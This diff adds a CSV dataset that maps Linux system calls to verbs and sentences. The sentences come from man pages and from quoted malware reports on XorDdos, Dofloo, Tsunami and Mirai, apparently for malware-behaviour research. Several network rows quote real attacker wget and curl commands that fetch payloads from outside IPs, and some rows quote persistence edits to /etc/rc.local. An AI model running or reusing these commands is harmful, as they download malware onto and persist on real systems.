@@ -1,0 +1,514 @@
+EntityType,ActionType,Source,Syscall,EnVerb,Sentence
+DEVICE,DEVICE,man,io_cancel(),cancel,cancel an outstanding asynchronous I/O operation
+DEVICE,DEVICE,man,io_destroy(),destroy,destroy an asynchronous I/O context
+DEVICE,DEVICE,man,io_getevents(),read,read asynchronous I/O events from the completion queue
+DEVICE,DEVICE,man,io_setup(),create,create an asynchronous I/O context
+DEVICE,DEVICE,man,io_submit(),submit,submit asynchronous I/O blocks for processing
+DEVICE,DEVICE,man,ioctl(),control,control device
+DEVICE,DEVICE,man,ioctl(),manipulate,The ioctl() function manipulates the underlying device parameters of special files.
+DEVICE,DEVICE,man,ioperm(),set,set port input/output permissions
+DEVICE,DEVICE,man,iopl(),change,change I/O privilege level
+DEVICE,DEVICE,man,pciconfig_iobase(),handle,pci device information handling
+DEVICE,DEVICE,man,pciconfig_read(),handle,pci device information handling
+DEVICE,DEVICE,man,pciconfig_write(),handle,pci device information handling
+DEVICE,DEVICE,man,swapoff(),start,start/stop swapping to file/device
+DEVICE,DEVICE,man,swapon(),start,start/stop swapping to file/device
+DEVICE,INFO_GET,man,get_kernel_syms(),exported,retrieve exported kernel and module symbols
+DEVICE,INFO_GET,man,getcpu(),determine,determine CPU and NUMA node on which the calling thread is running
+DEVICE,INFO_GET,man,getpriority(),get,get/set program scheduling priority
+DEVICE,INFO_GET,man,getrusage(),get,get resource usage
+DEVICE,INFO_GET,man,ipc(),call,System V IPC system calls
+DEVICE,INFO_GET,man,kexec_file_load(),load,load a new kernel for later execution
+DEVICE,INFO_GET,man,kexec_load(),load,load a new kernel for later execution
+DEVICE,INFO_GET,man,madvise(),give,give advice about use of memory
+DEVICE,INFO_GET,man,msgget(),get,get a System V message queue identifier
+DEVICE,INFO_GET,man,oldolduname(),get,get name and information about current kernel
+DEVICE,INFO_GET,man,olduname(),get,get name and information about current kernel
+DEVICE,INFO_GET,man,request_key(),request,request a key from the kernel's key management facility
+DEVICE,INFO_GET,man,sched_get_priority_max(),get,get static priority range
+DEVICE,INFO_GET,man,sched_get_priority_min(),get,get static priority range
+DEVICE,INFO_GET,man,semget(),get,get a System V semaphore set identifier
+DEVICE,INFO_GET,man,syslog(),read,read and/or clear kernel message ring buffer; set console_loglevel
+DEVICE,INFO_GET,man,syslog(),clear,read and/or clear kernel message ring buffer; set console_loglevel
+DEVICE,INFO_GET,man,syslog(),set,read and/or clear kernel message ring buffer; set console_loglevel
+DEVICE,INFO_GET,man,ustat(),get,get filesystem statistics
+DEVICE,INFO_SET,man,_sysctl(),read,read/write system parameters
+DEVICE,INFO_SET,man,add_key(),add,add a key to the kernel's key management facility
+DEVICE,INFO_SET,man,keyctl(),manipulate,manipulate the kernel's key management facility
+DEVICE,INFO_SET,man,perf_event_open(),set,set up performance monitoring
+DEVICE,INFO_SET,man,setdomainname(),set,get/set NIS domain name
+DEVICE,INFO_SET,man,sethostname(),set,get/set hostname
+DEVICE,INFO_SET,man,setpriority(),set,get/set program scheduling priority
+DEVICE,INFO_SET,man,setrlimit(),set,get/set resource limits
+DEVICE,INFO_SET,man,shmctl(),shared,System V shared memory control
+FILE,ACCESS,man,access(),check,check real user's permissions for a file
+FILE,ACCESS,man,access(),access,access() checks whether the calling process can access the file pathname.
+FILE,ACCESS,man,faccessat(),check,check user's permissions for a file
+FILE,CLOSE,man,close(),close,close a file descriptor
+FILE,CLOSE,man,close(),free,the resources associated with the open file description are freed
+FILE,CREATE_OPEN,man,creat(),create,open and possibly create a file
+FILE,CREATE_OPEN,man,epoll_create(),open,open an epoll file descriptor
+FILE,CREATE_OPEN,man,epoll_create1(),open,open an epoll file descriptor
+FILE,CREATE_OPEN,man,flock(),apply,apply or remove an advisory lock on an open file
+FILE,CREATE_OPEN,man,link(),make,make a new name for a file
+FILE,CREATE_OPEN,man,link(),create,link() creates a new link (also known as a hard link) to an existing file.
+FILE,CREATE_OPEN,Xorddos.Micro,link(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
+FILE,CREATE_OPEN,Dofloo.Tend,link(),add,This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local
+FILE,CREATE_OPEN,Tsunami.Aquasec2,link(),drop,The file k.sh that was dropped and executed on the attacked server
+FILE,CREATE_OPEN,man,linkat(),create ,create a file link relative to directory file descriptors
+FILE,CREATE_OPEN,man,memfd_create(),create,create an anonymous file
+FILE,CREATE_OPEN,man,mkdir(),create ,create a directory
+FILE,CREATE_OPEN,Miria.IsSans,mkdir(),mount,big-ip mounts the /usr partition read-only.
+FILE,CREATE_OPEN,man,mkdirat(),create,create a directory
+FILE,CREATE_OPEN,man,mknod(),create,create a special or ordinary file
+FILE,CREATE_OPEN,man,mknodat(),create,create a special or ordinary file
+FILE,CREATE_OPEN,man,mmap(),map,map or unmap files or devices into memory
+FILE,CREATE_OPEN,man,mmap(),create,mmap() creates a new mapping in the virtual address space of the calling process.
+FILE,CREATE_OPEN,man,mmap2(),map,map files or devices into memory
+FILE,CREATE_OPEN,man,name_to_handle_at(),obtain,obtain handle for a pathname and open file via a handle
+FILE,CREATE_OPEN,man,name_to_handle_at(),open,obtain handle for a pathname and open file via a handle
+FILE,CREATE_OPEN,man,open(),open,open and possibly create a file or device
+FILE,CREATE_OPEN,man,open(),create,open and possibly create a file or device
+FILE,CREATE_OPEN,Xorddos.Micro,open(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
+FILE,CREATE_OPEN,Dofloo.Syscall,open(),add,Persistence is achieved by the malware by adding to /etc/rc.local and the /etc/init.d/boot.local files (in the auto_boot function);
+FILE,CREATE_OPEN,Xorddos.Micro,open(),drop,The malware drops an init script at the location /etc/init.d.
+FILE,CREATE_OPEN,Xorddos.Micro,open(),mount,one reason for the daemon process to change the directory to the root partition (“/“)is because running the process from the mounted file system prevents unmounting unless the process is stopped.
+FILE,CREATE_OPEN,man,open_by_handle_at(),obtain,obtain handle for a pathname and open file via a handle
+FILE,CREATE_OPEN,man,open_by_handle_at(),open,obtain handle for a pathname and open file via a handle
+FILE,CREATE_OPEN,man,openat(),open,open a file relative to a directory file descriptor
+FILE,CREATE_OPEN,Miria.IsSans,openat(),mount,big-ip mounts the /usr partition read-only.
+FILE,CREATE_OPEN,man,symlink(),make,make a new name for a file
+FILE,CREATE_OPEN,man,symlink(),create ,symlink() creates a symbolic link named newpath which contains the string oldpath.
+FILE,CREATE_OPEN,Xorddos.Micro,symlink(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
+FILE,CREATE_OPEN,Dofloo.Tend,symlink(),add,This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local
+FILE,CREATE_OPEN,Tsunami.Aquasec3,symlink(),drop,The file k.sh that was dropped and executed on the attacked server
+FILE,CREATE_OPEN,man,symlinkat(),create ,create a symbolic link relative to a directory file descriptor
+FILE,CREATE_OPEN,man,umask(),set,set file mode creation mask
+FILE,DELETE,man,fremovexattr(),remove,remove an extended attribute
+FILE,DELETE,man,munmap(),ummap,unmap files or devices into memory
+FILE,DELETE,man,remove(),remove,remove a file or directory
+FILE,DELETE,None,remove(),drop,drop the file from the victim machine
+FILE,DELETE,Darlloz.Trend,rm(),delete,This worm deletes the following files
+FILE,DELETE,man,rm(),remove,removes each specified file
+FILE,DELETE,None,rm(),drop,drops each specified file
+FILE,DELETE,man,rmdir(),delete,delete a directory
+FILE,DELETE,None,rmdir(),drop,drop the file from the victim machine
+FILE,DELETE,man,unlink(),delete,delete a name and possibly the file it refers to
+FILE,DELETE,man,unlinkat(),remove,remove a directory entry relative to a directory file descriptor
+FILE,DELETE,None,unlinkat(),drop,drop the file from the victim machine
+FILE,DIR,man,getcwd(),get,get current working directory
+FILE,DIR,man,getdents(),get,get directory entries
+FILE,FD_DUP,man,dup(),duplicate,duplicate a file descriptor
+FILE,FD_DUP,man,dup(),create,These system calls create a copy of the file descriptor oldfd
+FILE,FD_DUP,man,dup(),share,share file offset and file status flags
+FILE,FD_DUP,man,dup2(),duplicate,duplicate a file descriptor
+FILE,FD_DUP,man,dup2(),create,These system calls create a copy of the file descriptor oldfd
+FILE,FD_DUP,man,dup2(),share,share file offset and file status flags
+FILE,FD_DUP,man,dup3(),duplicate,duplicate a file descriptor
+FILE,FD_DUP,man,eventfd(),create,create a file descriptor for event notification
+FILE,FD_DUP,man,eventfd2(),create,create a file descriptor for event notification
+FILE,FD_DUP,man,signalfd(),create,create a file descriptor for accepting signals
+FILE,FD_DUP,man,userfaultfd(),create,create a file descriptor for handling page faults in user space
+FILE,FD_DUP,man,userfaultfd(),handle,create a file descriptor for handling page faults in user space
+FILE,FD_OTHER,man,epoll_pwait(),wait,wait for an I/O event on an epoll file descriptor
+FILE,FD_OTHER,man,epoll_wait(),wait,wait for an I/O event on an epoll file descriptor
+FILE,FD_OTHER,man,fcntl(),manipulate,manipulate file descriptor
+FILE,FD_OTHER,man,fcntl(),find,find the lowest numbered available file descriptor
+FILE,FD_OTHER,man,fcntl(),get,get a new file descriptor or the file status flags 
+FILE,FD_OTHER,man,fcntl(),set,set or clear a file segment lock
+FILE,FD_OTHER,man,fcntl64(),manipulate,manipulate file descriptor
+FILE,FD_OTHER,man,fcntl64(),find,find the lowest numbered available file descriptor
+FILE,FD_OTHER,man,fcntl64(),get,get a new file descriptor or the file status flags 
+FILE,FD_OTHER,man,fcntl64(),set,set or clear a file segment lock
+FILE,FD_OTHER,man,futimesat(),change,change timestamps of a file relative to a directory file descriptor
+FILE,FD_OTHER,man,sendfile(),transfer,transfer data between file descriptors
+FILE,FD_OTHER,man,sendfile64(),transfer,transfer data between file descriptors
+FILE,FD_OTHER,man,signalfd4(),create,create a file descriptor for accepting signals
+FILE,FD_OTHER,man,timerfd_create(),notify,timers that notify via file descriptors
+FILE,FD_OTHER,man,timerfd_settime(),notify,timers that notify via file descriptors
+FILE,FILE_READ,man,fgetxattr(),retrieve,retrieve an extended attribute value
+FILE,FILE_READ,man,flistxattr(),list,list extended attribute names
+FILE,FILE_READ,man,getdents64(),get,get directory entries
+FILE,FILE_READ,man,getxattr(),retrieve,retrieve an extended attribute value
+FILE,FILE_READ,man,lgetxattr(),retrieve,retrieve an extended attribute value
+FILE,FILE_READ,man,llistxattr(),list,list extended attribute names
+FILE,FILE_READ,man,pread64(),read,read from or write to a file descriptor at a given offset
+FILE,FILE_READ,man,preadv(),read,read or write data into multiple buffers
+FILE,FILE_READ,man,preadv2(),read,read or write data into multiple buffers
+FILE,FILE_READ,man,read(),read,read from a file descriptor
+FILE,FILE_READ,Dofloo.Security,read(),gather,"Once the malware has infected a system, it can gather system information, including model ID and CPU description, speed, family, model, and type."
+FILE,FILE_READ,Xorddos.Micro,read(),fetch,"The user mode malware calls the function getself(), which invokes readlink() to fetch the location of the malware file image on disk."
+FILE,FILE_READ,Xorddos.Intezer,read(),look,"As shown in Figure 6, the malware looks up its current path and moves the binary to the created folder. It hides the file by naming it “.po1kitd-update-k”."
+FILE,FILE_READ,Dofloo.Bleep,read(),see,campaigns started spreading to the cloud following the drop in activity seen by ransomware operations after the end of 2017.
+FILE,FILE_READ,Miria.Trend,read(),use,Exploits - takes advantage of a software vulnerability or security flaw and can be used to remotely access a network and gain elevated privileges
+FILE,FILE_READ,Xorddos.Micro,read(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
+FILE,FILE_READ,man,readahead(),initiate,initiate file readahead into page cache
+FILE,FILE_READ,man,readdir(),read,read directory entry
+FILE,FILE_READ,man,readlink(),read,read value of a symbolic link
+FILE,FILE_READ,man,readlink(),place,readlink() places the contents of the symbolic link path in the buffer buf
+FILE,FILE_READ,Dofloo.Trend,readlink(),gather,This Backdoor gathers the following data: CPU information Memory statistics IP address of infected machine Reads the following information from /proc:
+FILE,FILE_READ,Xorddos.Micro,readlink(),fetch,it calls the readlink API with the first parameter as /proc/self/exe to fetch its full process path.
+FILE,FILE_READ,Tsunami.Aquasec,readlink(),look,The attackers are looking for more vulnerable machines on the same network as the infected machine.
+FILE,FILE_READ,Dofloo.Syscall,readlink(),see,however before it overwrites this file it first checks to see if it has already done so.
+FILE,FILE_READ,Dofloo.Mal,readlink(),use,"how this malware use socket to connect an IP, for example, since the code is too long. But to be noted, since ARM architecture has different structure than Intel, and ARM is designed for the embedded systems, you will see many different method for the detail operation that is involving with the system calls."
+FILE,FILE_READ,Xorddos.Intezer,readlink(),extract,hostos	Distribution	Extracted from /etc/issue or /etc/redhat-release
+FILE,FILE_READ,man,readlinkat(),read,read value of a symbolic link
+FILE,FILE_READ,man,readv(),read,read or write data into multiple buffers
+FILE,FILE_READ,man,setxattr(),set,set an extended attribute value
+FILE,FILE_READ,man,sysfs(),get,get filesystem type information
+FILE,OTHER,man,_llseek(),offset,reposition read/write file offset
+FILE,OTHER,man,acct(),switch,switch process accounting on or off
+FILE,OTHER,man,chroot(),change,change root directory
+FILE,OTHER,man,copy_file_range(),copy,Copy a range of data from one file to another
+FILE,OTHER,man,fanotify_init(),create,create and initialize fanotify group
+FILE,OTHER,man,fanotify_init(),initialize,create and initialize fanotify group
+FILE,OTHER,man,fdatasync(),synchronize,synchronize a file's in
+FILE,OTHER,man,fsync(),synchronize,synchronize a file's in
+FILE,OTHER,man,inotify_add_watch(),add,add a watch to an initialized inotify instance
+FILE,OTHER,man,inotify_init(),initialize,initialize an inotify instance
+FILE,OTHER,man,inotify_init1(),initialize,initialize an inotify instance
+FILE,OTHER,man,inotify_rm_watch(),remove,remove an existing watch from an inotify instance
+FILE,OTHER,man,listxattr(),extended,list extended attribute names
+FILE,OTHER,man,lookup_dcookie(),return,return a directory entry's path
+FILE,OTHER,man,lseek(),reposition,reposition read/write file offset
+FILE,OTHER,man,modify_ldt(),get,get or set a per
+FILE,OTHER,man,msync(),synchronize,synchronize a file with a memory map
+FILE,OTHER,man,remap_file_pages(),create,create a nonlinear file mapping
+FILE,OTHER,man,sync_file_range(),sync,sync a file segment with disk
+FILE,OTHER,man,sync_file_range2(),sync,sync a file segment with disk
+FILE,OTHER,man,syncfs(),commit,commit filesystem caches to disk
+FILE,OTHER,man,tee(),duplicate,duplicating pipe content
+FILE,OTHER,man,timerfd_gettime(),notify,timers that notify via file descriptors
+FILE,STATUS,man,fstat(),get,get file status
+FILE,STATUS,man,fstat64(),get,get file status
+FILE,STATUS,man,fstatat64(),get,get file status
+FILE,STATUS,man,fstatfs(),get,get filesystem statistics
+FILE,STATUS,man,fstatfs64(),get,get filesystem statistics
+FILE,STATUS,man,lstat(),get,get file status
+FILE,STATUS,man,lstat64(),get,get file status
+FILE,STATUS,man,newfstatat(),get,get file status
+FILE,STATUS,man,oldfstat(),get,get file status
+FILE,STATUS,man,oldlstat(),get,get file status
+FILE,STATUS,man,oldstat(),get,get file status
+FILE,STATUS,man,stat(),get,get file status
+FILE,STATUS,man,stat64(),get,get file status
+FILE,STATUS,man,statfs(),get,get file system statistics
+FILE,STATUS,man,statfs64(),get,get filesystem statistics
+FILE,STATUS,man,statx(),get,get file status (extended)
+FILE,UPDATE,man,chdir(),change,changes the current working directory
+FILE,UPDATE,man,chmod(),change,change permissions of a file
+FILE,UPDATE,Xorddos.Micro,chmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
+FILE,UPDATE,Xorddos.Micro,chmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
+FILE,UPDATE,man,chown(),change,change ownership of a file
+FILE,UPDATE,man,chown32(),change,change ownership of a file
+FILE,UPDATE,man,fanotify_mark(),add,"add, remove, or modify an fanotify mark on a filesystem object"
+FILE,UPDATE,man,fchdir(),change,change working directory
+FILE,UPDATE,man,fchmod(),change,change permissions of a file
+FILE,UPDATE,Xorddos.Micro,fchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
+FILE,UPDATE,Xorddos.Micro,fchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
+FILE,UPDATE,man,fchmodat(),change,change permissions of a file
+FILE,UPDATE,man,fchown(),change,change ownership of a file
+FILE,UPDATE,man,fchown32(),change,change ownership of a file
+FILE,UPDATE,man,fchownat(),change,change ownership of a file
+FILE,UPDATE,man,fsetxattr(),set,set an extended attribute value
+FILE,UPDATE,man,ftruncate(),truncate,truncate a file to a specified length
+FILE,UPDATE,man,ftruncate64(),truncate,truncate a file to a specified length
+FILE,UPDATE,man,lchmod(),change,change permissions of a file
+FILE,UPDATE,Xorddos.Micro,lchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
+FILE,UPDATE,Xorddos.Micro,lchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
+FILE,UPDATE,man,lchown(),change,change ownership of a file
+FILE,UPDATE,man,lchown32(),change,change ownership of a file
+FILE,UPDATE,man,lremovexattr(),remove,remove an extended attribute
+FILE,UPDATE,man,lsetxattr(),set,set an extended attribute value
+FILE,UPDATE,man,pivot_root(),change,change the root mount
+FILE,UPDATE,man,pwrite64(),read,read from or write to a file descriptor at a given offset
+FILE,UPDATE,man,pwritev(),read,read or write data into multiple buffers
+FILE,UPDATE,man,pwritev2(),read,read or write data into multiple buffers
+FILE,UPDATE,man,removexattr(),remove,remove an extended attribute
+FILE,UPDATE,man,rename(),change,change the name or location of a file
+FILE,UPDATE,man,rename(),rename,"rename() renames a file, moving it between directories if required."
+FILE,UPDATE,Xorddos.Trend2,rename(),update,Figure 3. Code snippet showing XORDDoS’ capability to download and update files.
+FILE,UPDATE,Dofloo.Syscall,rename(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
+FILE,UPDATE,Dofloo.Security,rename(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
+FILE,UPDATE,Dofloo.Bleep,rename(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
+FILE,UPDATE,man,renameat(),change,change the name or location of a file
+FILE,UPDATE,man,renameat2(),change,change the name or location of a file
+FILE,UPDATE,man,sync(),commit,commit filesystem caches to disk
+FILE,UPDATE,man,truncate(),truncate,truncate a file to a specified length
+FILE,UPDATE,man,truncate64(),truncate,truncate a file to a specified length
+FILE,UPDATE,man,utime(),change,change file last access and modification times
+FILE,UPDATE,man,utimensat(),change,change file timestamps with nanosecond precision
+FILE,UPDATE,man,utimes(),change,change file last access and modification times
+FILE,UPDATE,man,write(),write,write to a file descriptor
+FILE,UPDATE,Xorddos.Micro,write(),update,"if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
+FILE,UPDATE,Dofloo.Syscall,write(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
+FILE,UPDATE,Dofloo.Security,write(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
+FILE,UPDATE,Dofloo.Bleep,write(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
+FILE,UPDATE,Xorddos.Micro,write(),set,"The malware calls the subroutine daemon(__nochdir, __noclose) to set itself as a background daemon process, which internally calls fork() and setsid()."
+FILE,UPDATE,man,writev(),read,read or write data into multiple buffers
+FILE,WAIT,man,poll(),wait,wait for some event on a file descriptor
+FILE,WAIT,man,ppoll(),wait,wait for some event on a file descriptor
+ID,ID_GET,man,getegid(),get,get group identity
+ID,ID_GET,man,getegid32(),get,get group identity
+ID,ID_GET,man,geteuid(),get,get user identity
+ID,ID_GET,man,geteuid32(),get,get user identity
+ID,ID_GET,man,getgid(),get,get group identity
+ID,ID_GET,man,getgid32(),get,get group identity
+ID,ID_GET,man,getgroups(),get,get/set list of supplementary group IDs
+ID,ID_GET,man,getgroups32(),get,get/set list of supplementary group IDs
+ID,ID_GET,man,getpgid(),set,set/get process group
+ID,ID_GET,man,getpgrp(),set,set/get process group
+ID,ID_GET,man,getpid(),get,get process identification
+ID,ID_GET,man,getppid(),get,get process identification
+ID,ID_GET,man,getresgid(),get,"get real, effective, and saved user/group IDs"
+ID,ID_GET,man,getresgid32(),get,"get real, effective, and saved user/group IDs"
+ID,ID_GET,man,getresuid(),get,"get real, effective, and saved user/group IDs"
+ID,ID_GET,man,getresuid32(),get,"get real, effective, and saved user/group IDs"
+ID,ID_GET,man,getsid(),get,get session ID
+ID,ID_GET,man,gettid(),get,get thread identification
+ID,ID_GET,man,getuid(),get,get user identity
+ID,ID_GET,man,getuid32(),get,get user identity
+ID,ID_SET,man,setfsgid(),set,set group identity used for filesystem checks
+ID,ID_SET,man,setfsgid32(),set,set group identity used for filesystem checks
+ID,ID_SET,man,setfsuid(),set,set user identity used for filesystem checks
+ID,ID_SET,man,setfsuid32(),set,set user identity used for filesystem checks
+ID,ID_SET,man,setgid(),set,set group identity
+ID,ID_SET,man,setgid32(),set,set group identity
+ID,ID_SET,man,setgroups(),set,get/set list of supplementary group IDs
+ID,ID_SET,man,setgroups32(),set,get/set list of supplementary group IDs
+ID,ID_SET,man,setpgid(),set,set/get process group
+ID,ID_SET,man,setregid(),set,set real and/or effective user or group ID
+ID,ID_SET,man,setregid32(),set,set real and/or effective user or group ID
+ID,ID_SET,man,setresgid(),set,"set real, effective, and saved user or group ID"
+ID,ID_SET,man,setresgid32(),set,"set real, effective, and saved user or group ID"
+ID,ID_SET,man,setresuid(),set,"set real, effective, and saved user or group ID"
+ID,ID_SET,man,setresuid32(),set,"set real, effective, and saved user or group ID"
+ID,ID_SET,man,setreuid(),set,set real and/or effective user or group ID
+ID,ID_SET,man,setreuid32(),set,set real and/or effective user or group ID
+ID,ID_SET,man,setsid(),set,creates a session and sets the process group ID
+ID,ID_SET,Xorddos.Micro,setsid(),assign,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
+ID,ID_SET,man,setuid(),set,set user identity
+ID,ID_SET,man,setuid32(),set,set user identity
+INFO,INFO_GET,man,getrlimit(),get,get/set resource limits
+INFO,INFO_GET,man,prlimit64(),get,get/set resource limits
+INFO,INFO_GET,man,sysinfo(),return,returns information on overall system statistics
+INFO,INFO_GET,man,sysinfo(),get,sysinfo() provides a simple way of getting overall system statistics.
+INFO,INFO_GET,None,sysinfo(),gather,gather system information
+INFO,INFO_GET,None,sysinfo(),look,look for system information
+INFO,INFO_GET,None,sysinfo(),find,find linux kernel information
+INFO,INFO_GET,man,ugetrlimit(),get,get/set resource limits
+INFO,INFO_GET,man,uname(),get,get name and information about current kernel
+INFO,INFO_GET,None,uname(),gather,gather system information
+INFO,INFO_GET,None,uname(),look,look for system information
+INFO,INFO_GET,None,uname(),find,find linux kernel information
+NET,NET_CLOSE,man,mq_unlink(),remove,remove a message queue
+NET,NET_CLOSE,man,shutdown(),shut,shut down part of a full
+NET,NET_CONNECT,man,accept(),accept,accept a connection on a socket
+NET,NET_CONNECT,man,accept4(),accept,accept a connection on a socket
+NET,NET_CONNECT,man,bind(),bind,bind a name to a socket
+NET,NET_CONNECT,man,bind(),assign,bind() assigns the address specified by addr to the socket
+NET,NET_CONNECT,Xorddos.Micro,bind(),hook,Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6
+NET,NET_CONNECT,man,connect(),initiate,initiate a connection on a socket
+NET,NET_CONNECT,man,connect(),connect,The connect() system call connects the socket referred to by the file descripton
+NET,NET_CONNECT,man,mq_notify(),register,register for notification when a message is available
+NET,NET_CONNECT,man,mq_open(),open,open a message queue
+NET,NET_CONNECT,man,pipe(),create,create pipe
+NET,NET_CONNECT,man,pipe2(),create,create pipe
+NET,NET_CONNECT,man,socket(),create,create an endpoint for communication
+NET,NET_CONNECT,Xorddos.Micro,socket(),hook,Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6
+NET,NET_CONNECT,man,socketpair(),create,create a pair of connected sockets
+NET,NET_OPTION,man,getpeername(),get,get name of connected peer socket
+NET,NET_OPTION,man,getsockname(),get,get socket name
+NET,NET_OPTION,man,getsockopt(),get,get and set options on sockets
+NET,NET_OPTION,man,getsockopt(),manipulate,getsockopt() and setsockopt() manipulate options for the socket
+NET,NET_OPTION,man,mq_getsetattr(),get,get/set message queue attributes
+NET,NET_OPTION,man,mq_getsetattr(),set,get/set message queue attributes
+NET,NET_OPTION,man,setsockopt(),set,get and set options on sockets
+NET,NET_OPTION,man,setsockopt(),manipulate,getsockopt() and setsockopt() manipulate options for the socket
+NET,NET_TRANSMIT,man,listen(),listen,listen for connections on a socket
+NET,NET_TRANSMIT,man,mq_timedreceive(),receive,receive a message from a message queue
+NET,NET_TRANSMIT,man,mq_timedsend(),send,send a message to a message queue
+NET,NET_TRANSMIT,man,recv(),receive,receive a message from a socket
+NET,NET_TRANSMIT,Miria.NJCCIC,recv(),communicate,Miori has resurfaced using a text-based protocol to communicate with its command-and-control (C&C) rather than the customary use of binary-based protocol.
+NET,NET_TRANSMIT,Xorddos.Micro,recv(),download,The attacker communicates with a bot to SSH brute force a target device and download XorDdos.
+NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),wget,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
+NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),curl,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
+NET,NET_TRANSMIT,man,recvfrom(),receive,receive a message from a socket
+NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
+NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),download,Code snippet showing XORDDoS’ capability to download and update files.
+NET,NET_TRANSMIT,Xorddos.Trend3,recvfrom(),wget,wget http://122.51.133.49:10086/VIP –O VIP
+NET,NET_TRANSMIT,Tsunami.Jun,recvfrom(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
+NET,NET_TRANSMIT,man,recvmmsg(),receive,receive multiple messages on a socket
+NET,NET_TRANSMIT,man,recvmsg(),receive,receive a message from a socket
+NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
+NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
+NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
+NET,NET_TRANSMIT,Tsunami.Jun,recvmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
+NET,NET_TRANSMIT,man,send(),send,send a message on a socket
+NET,NET_TRANSMIT,None,send(),transfer,transfer data to command and control server.
+NET,NET_TRANSMIT,Xorddos.Trend2,send(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
+NET,NET_TRANSMIT,Xorddos.Trend2,send(),download,Code snippet showing XORDDoS’ capability to download and update files.
+NET,NET_TRANSMIT,Xorddos.Trend4,send(),wget,wget http://122.51.133.49:10086/VIP –O VIP
+NET,NET_TRANSMIT,Tsunami.Jun,send(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
+NET,NET_TRANSMIT,man,sendmmsg(),send,send multiple messages on a socket
+NET,NET_TRANSMIT,man,sendmsg(),send,send a message on a socket
+NET,NET_TRANSMIT,None,sendmsg(),transfer,transfer data to command and control server.
+NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
+NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
+NET,NET_TRANSMIT,Xorddos.Trend6,sendmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
+NET,NET_TRANSMIT,Tsunami.Jun,sendmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
+NET,NET_TRANSMIT,man,sendto(),send,send a message on a socket
+NET,NET_TRANSMIT,None,sendto(),transfer,transfer data to command and control server.
+NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
+NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),download,Code snippet showing XORDDoS’ capability to download and update files.
+NET,NET_TRANSMIT,Xorddos.Trend5,sendto(),wget,wget http://122.51.133.49:10086/VIP –O VIP
+NET,NET_TRANSMIT,Tsunami.Jun,sendto(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
+PROC,PROC_EXAM,man,rt_sigaction(),examine,examine and change a signal action
+PROC,PROC_EXAM,man,rt_sigaction(),change,examine and change a signal action
+PROC,PROC_EXAM,man,rt_sigpending(),examine,examine pending signals
+PROC,PROC_EXAM,man,rt_sigprocmask(),examine,examine and change blocked signals
+PROC,PROC_EXAM,man,rt_sigprocmask(),change,examine and change blocked signals
+PROC,PROC_EXAM,man,sigaction(),examine,examine and change a signal action
+PROC,PROC_EXAM,man,sigaction(),change,examine and change a signal action
+PROC,PROC_EXAM,man,sigpending(),examine,examine pending signals
+PROC,PROC_EXAM,man,sigprocmask(),examine,examine and change blocked signals
+PROC,PROC_EXAM,man,sigprocmask(),change,examine and change blocked signals
+PROC,PROC_EXE,man,clone(),create,create a child process
+PROC,PROC_EXE,Mirai.Impera,clone(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
+PROC,PROC_EXE,Xorddos.Intezer,clone(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
